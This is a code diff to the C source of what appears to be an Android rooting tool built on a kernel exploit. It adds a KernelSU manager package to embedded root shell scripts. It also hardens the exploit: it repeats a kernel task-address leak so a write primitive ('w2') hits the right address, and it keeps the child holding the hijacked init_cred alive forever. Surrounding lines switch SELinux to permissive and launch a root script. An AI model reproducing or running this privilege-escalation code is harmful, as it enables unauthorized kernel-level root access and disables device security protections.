@@ -834,6 +834,7 @@ static int write_lateload_recovery_script(void) {
     "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksud; fi\n"
     "if [ ! -f \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
     "if [ ! -f \"$KSUD\" ]; then KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -n 1); fi\n"
+    "if [ ! -f \"$KSUD\" ]; then KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -n 1); fi\n"
     "if [ -f \"$KSUD\" ]; then chmod 755 \"$KSUD\" 2>/dev/null; fi\n"
     "POLICY_REPAIR=/data/adb/anchor/repair_selinux_policy.sh\n"
     "POLICY_RC=127\n"
@@ -847,6 +848,7 @@ static int write_lateload_recovery_script(void) {
     "if [ \"$POLICY_RC\" -eq 0 ]; then state late-load-policy-repaired \"$POLICY_RC\"; else state late-load-policy-repair-failed \"$POLICY_RC\"; fi\n"
     "APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed -n 's/^package://p' | head -n 1)\n"
     "if [ -z \"$APK\" ]; then APK=$(pm path me.weishu.kernelsu 2>/dev/null | sed -n 's/^package://p' | head -n 1); fi\n"
+    "if [ -z \"$APK\" ]; then APK=$(pm path com.kowx712.supermanager 2>/dev/null | sed -n 's/^package://p' | head -n 1); fi\n"
     "MANAGER_LOG=$STATE_DIR/manager-selection.log\n"
     "if [ -x \"$KSUD\" ] && [ -n \"$APK\" ]; then\n"
     "  \"$KSUD\" kernel dynamic-manager set-apk \"$APK\" >\"$MANAGER_LOG\" 2>&1\n"
@@ -892,6 +894,7 @@ static int write_root_script_at(const char *script_path) {
     "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksud; fi\n"
     "if [ ! -f \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
     "if [ ! -f \"$KSUD\" ]; then KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -n 1); fi\n"
+    "if [ ! -f \"$KSUD\" ]; then KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -n 1); fi\n"
     "if [ -f \"$KSUD\" ]; then chmod 755 \"$KSUD\" 2>/dev/null; fi\n"
     "if [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
     "  chmod 755 \"$KSUD\" 2>/dev/null\n"
@@ -911,6 +914,7 @@ static int write_root_script_at(const char *script_path) {
     "    done\n"
     "    APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed -n 's/^package://p' | head -n 1)\n"
     "    if [ -z \"$APK\" ]; then APK=$(pm path me.weishu.kernelsu 2>/dev/null | sed -n 's/^package://p' | head -n 1); fi\n"
+    "    if [ -z \"$APK\" ]; then APK=$(pm path com.kowx712.supermanager 2>/dev/null | sed -n 's/^package://p' | head -n 1); fi\n"
     "    MANAGER_LOG=$STATE_DIR/manager-selection.log\n"
     "    if [ -x \"$KSUD\" ] && [ -n \"$APK\" ]; then\n"
     "      \"$KSUD\" kernel dynamic-manager set-apk \"$APK\" >\"$MANAGER_LOG\" 2>&1\n"
@@ -1050,13 +1054,34 @@ static void dispose_candidate_child(struct child_pipes *p, pid_t child) {
   waitpid(child, NULL, 0);
 }
 
+/* rooted exits kfree the static init_cred (w2 stores it with no
+ * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
+static void park_rooted_child(void) {
+  FILE *f = fopen("/proc/self/oom_score_adj", "w");
+  if (f) {
+    fputs("-1000", f);
+    fclose(f);
+  }
+  for (int fd = 3; fd < 256; fd++) close(fd);
+  for (;;) pause();
+}
+
 static void child_main(struct child_pipes *p) {
   /* A failed launcher must not leave a candidate task alive for a later UI
    * retry.  The root-script child is also reaped before this child returns. */
   prctl(PR_SET_PDEATHSIG, SIGKILL);
   if (getppid() == 1) _exit(1);
   close(p->task_r); close(p->cmd_w); close(p->uid_r);
+  /* a real leak reproduces, a fluke vote winner does not. w2 writes to
+   * this address, so two runs must agree or the leak is discarded. */
   uintptr_t my_task = perf_find_task();
+  int leak_agreed = 0;
+  for (int i = 0; i < 2 && my_task; i++) {
+    uintptr_t again = perf_find_task();
+    if (again == my_task) { leak_agreed = 1; break; }
+    my_task = again;
+  }
+  if (!leak_agreed) my_task = 0;
   write(p->task_w, &my_task, sizeof(my_task));
   close(p->task_w);
   if (!my_task) _exit(1);
@@ -1072,7 +1097,7 @@ static void child_main(struct child_pipes *p) {
    * the credential transition has completed. */
   if (load_policy_mode && !deploy_policy_repair_script()) {
     write_bridge_state("root-ready-policy-repair-pending");
-    _exit(1);
+    park_rooted_child();
   }
   if (!load_policy_mode) {
     write_policy_repair_disabled_state();
@@ -1080,19 +1105,26 @@ static void child_main(struct child_pipes *p) {
   }
   if (!write_root_script() || access(ROOT_SCRIPT_PATH, X_OK) != 0) {
     write_bridge_state("root-script-unavailable");
-    _exit(1);
+    park_rooted_child();
   }
 #if ANCHOR_ENABLE_LATELOAD_RECOVERY
   if (load_policy_mode && !write_lateload_recovery_script()) {
     write_bridge_state("late-load-script-unavailable");
-    _exit(1);
+    park_rooted_child();
   }
 #else
   /* Do not leave a Recovery script from an earlier build armed. */
   unlink(LATELOAD_RECOVERY_PATH);
 #endif
+  /* Don't leak app-side fds into the root shell chain: ksud/zygisk
+   * daemons must not keep their write ends open. */
+  for (int fd = 3; fd < 1024; fd++) {
+    int fl = fcntl(fd, F_GETFD);
+    if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
+  }
   pid_t gc = fork();
   if (gc == 0) {
+    if (setsid() < 0) { /* continue */ }
     int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
     if (efd >= 0) { write(efd, "0", 1); close(efd); }
     execl("/system/bin/sh", "sh", ROOT_SCRIPT_PATH, NULL);
@@ -1100,6 +1132,7 @@ static void child_main(struct child_pipes *p) {
   }
   if (gc > 0) waitpid(gc, NULL, 0);
   cleanup_tmp_compat_files();
+  park_rooted_child();
 }
 
 static pid_t spawn_child(struct child_pipes *p) {
